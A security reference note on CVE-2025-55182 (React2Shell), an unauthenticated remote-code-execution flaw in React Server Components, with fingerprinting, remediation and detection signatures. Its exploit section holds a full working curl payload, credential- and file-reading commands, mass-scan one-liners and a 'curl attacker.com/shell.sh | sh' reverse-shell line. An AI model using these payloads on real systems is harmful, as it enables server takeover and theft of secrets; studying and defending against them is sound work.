---
#cve
---

# CVE-2025-55182 (React2Shell)

## What is it

### The Simple Version
A critical vulnerability in React Server Components that lets attackers run any command on a server just by sending a specially crafted HTTP request. No login required. Near 100% reliability. CVSS 10/10.

**Analogy:** Imagine a mail sorting machine that reads package labels and executes whatever instructions are written on them. An attacker sends a package labeled "open the vault door" and the machine just... does it.

### Technical Details
The vulnerability exists in the `react-server` package's handling of the RSC "Flight" protocol. It's a logical deserialization flaw where the server processes RSC payloads unsafely, allowing prototype pollution that chains to RCE via `child_process.execSync()`.

**Disclosed:** December 3, 2025
**CVSS:** 10.0 (Critical)
**Related:** CVE-2025-66478 (Next.js specific, rejected as duplicate)

### Affected Versions
| Package | Vulnerable | Patched |
|---------|------------|---------|
| React | 19.0, 19.1.0, 19.1.1, 19.2.0 | 19.0.1, 19.1.2, 19.2.1 |
| Next.js | 14.3.0-canary.77+, 15.x, 16.x | 14.2.35, 15.1.4 |

**Also affects:** Vite, Parcel, React Router, RedwoodSDK, Waku - anything using React Server Components

### What Can an Attacker Do?
- Execute arbitrary commands on the server (RCE)
- Read sensitive files, environment variables, secrets
- Install backdoors, malware, cryptominers
- Pivot to internal network
- Exfiltrate databases and customer data
- Complete server takeover

### Why It's Dangerous
- **Default configs vulnerable** - `create-next-app` production builds exploitable with no code changes
- **No authentication required** - Just a crafted HTTP request
- **Near 100% reliability** - Exploit works consistently
- **Actively exploited in the wild** - APT groups already using it
- **Massive attack surface** - Next.js powers millions of sites

### Active Exploitation
Observed by Wiz Research, Amazon Threat Intelligence, Datadog, Unit42:
- Automated scanning for vulnerable endpoints
- CL-STA-1015 (suspected PRC MSS) deploying SNOWLIGHT and VShell trojans
- Cryptominer installations
- Initial access broker activity

---

## How to Find it

### Identify It Manually

**Passive Fingerprinting (no requests):**
```javascript
// Check page source for:
window.__next_f    // or self.__next_f - App Router marker
__NEXT_DATA__      // Pages Router (less likely vulnerable)
react-server-dom-webpack
/_next/static/     // Next.js build artifacts
```

**Active Fingerprinting:**
```bash
# Send RSC header, check response
curl -s -I "https://target.com/" -H "RSC: 1" | grep -i "content-type\|vary"

# Look for:
# Content-Type: text/x-component
# Vary: RSC
```

**Check Response Body:**
```bash
# React Flight Protocol pattern
curl -s "https://target.com/" -H "RSC: 1" | head -c 100
# Vulnerable if matches: /^\d+:["IHL]/
```

### Identify It In Code
Look for Next.js App Router usage:
```
app/
├── layout.js      # App Router
├── page.js
└── actions.js     # Server Actions with 'use server'
```

### Identify the Variant/Type

| Indicator | Meaning |
|-----------|---------|
| `window.__next_f` | Next.js App Router (potentially vulnerable) |
| `__NEXT_DATA__` | Pages Router (not vulnerable to this CVE) |
| `text/x-component` | RSC active, likely vulnerable |
| `Vary: RSC` | Server responds differently to RSC header |

---

## How to Exploit it

### Exploitation Framework
1. **Fingerprint** - Confirm RSC is in use
2. **Identify endpoint** - Find path that accepts POST with `Next-Action` header
3. **Send payload** - Multipart form with prototype pollution chain
4. **Extract output** - Base64 decode the `digest` field from error response

### Payloads

**Basic RCE Payload:**
```bash
curl -X POST "https://target.com/any-path" \
     -H "Next-Action: x" \
     -H "Content-Type: multipart/form-data; boundary=----Boundary" \
     --data-binary $'------Boundary\r\nContent-Disposition: form-data; name="0"\r\n\r\n{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"var res=process.mainModule.require(\'child_process\').execSync(\'id\').toString(\'base64\');throw Object.assign(new Error(\'x\'),{digest: res});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}\r\n------Boundary\r\nContent-Disposition: form-data; name="1"\r\n\r\n"$@0"\r\n------Boundary\r\nContent-Disposition: form-data; name="2"\r\n\r\n[]\r\n------Boundary--'
```

**Decode Output:**
```bash
# Response contains: "digest":"BASE64_OUTPUT"
echo "BASE64_OUTPUT" | base64 -d
```

**Common Commands:**
```bash
id                          # Check user context
cat /etc/passwd             # Read system files
env                         # Dump environment variables
cat .env                    # Application secrets
curl attacker.com/shell.sh | sh  # Reverse shell
```

### Tools

**React2Shell (Chrome Extension):**
```bash
git clone https://github.com/sho-luv/React2Shell
# Load unpacked in chrome://extensions
# Features: Passive detection, active fingerprinting, exploit execution
```

**Nuclei Template:**
```bash
nuclei -t cves/2025/CVE-2025-55182.yaml -u https://target.com
```

**Mass Scanning:**
```bash
# httpx + nuclei
cat urls.txt | httpx -silent | nuclei -t CVE-2025-55182.yaml
```

---

## How to Fix it

- **Upgrade immediately** - React 19.0.1/19.1.2/19.2.1, Next.js 14.2.35/15.1.4
- **WAF rules are NOT sufficient** - Patch is required
- **Audit Server Actions** - Review all `'use server'` functions
- **Block exploit indicators:**
  - `Next-Action` header with suspicious payloads
  - `__proto__` or `constructor` in request bodies
- **Monitor for exploitation:**
  - Unexpected child_process spawning
  - Base64 encoded command execution
  - Outbound connections from web servers

### Detection Signatures
```
# Request indicators
Next-Action: x
__proto__
$1:__proto__:then
process.mainModule.require

# Response indicators
"digest":
```

---

## How to Learn About it

### References
- [React Official Disclosure](https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components)
- [Vercel Summary](https://vercel.com/changelog/cve-2025-55182)
- [Wiz Blog - React2Shell Analysis](https://www.wiz.io/blog/critical-vulnerability-in-react-cve-2025-55182)
- [Unit42 - Post-Exploitation Activity](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- [Rapid7 ETR](https://www.rapid7.com/blog/post/etr-react2shell-cve-2025-55182-critical-unauthenticated-rce-affecting-react-server-components/)
- [Tenable FAQ](https://www.tenable.com/blog/react2shell-cve-2025-55182-react-server-components-rce)
- [Akamai Analysis](https://www.akamai.com/blog/security-research/cve-2025-55182-react-nextjs-server-functions-deserialization-rce)
- [Datadog Security Labs](https://securitylabs.datadoghq.com/articles/cve-2025-55182-react2shell-remote-code-execution-react-server-components/)
- [OffSec Technical Writeup](https://www.offsec.com/blog/cve-2025-55182/)

### Tools
- https://github.com/sho-luv/React2Shell (improved fork)
- https://github.com/mrknow001/RSC_Detector (original)
- https://github.com/assetnote/react2shell-scanner (Assetnote scanner)
- https://github.com/Chocapikk/CVE-2025-55182 (Chocapikk exploit)
- https://cloud.projectdiscovery.io/library/CVE-2025-55182 (Nuclei template)
- https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2025/CVE-2025-55182.yaml (Nuclei template source)

### Related Notes
- [[Prototype Pollution]]
- [[NextJS Server Actions]]
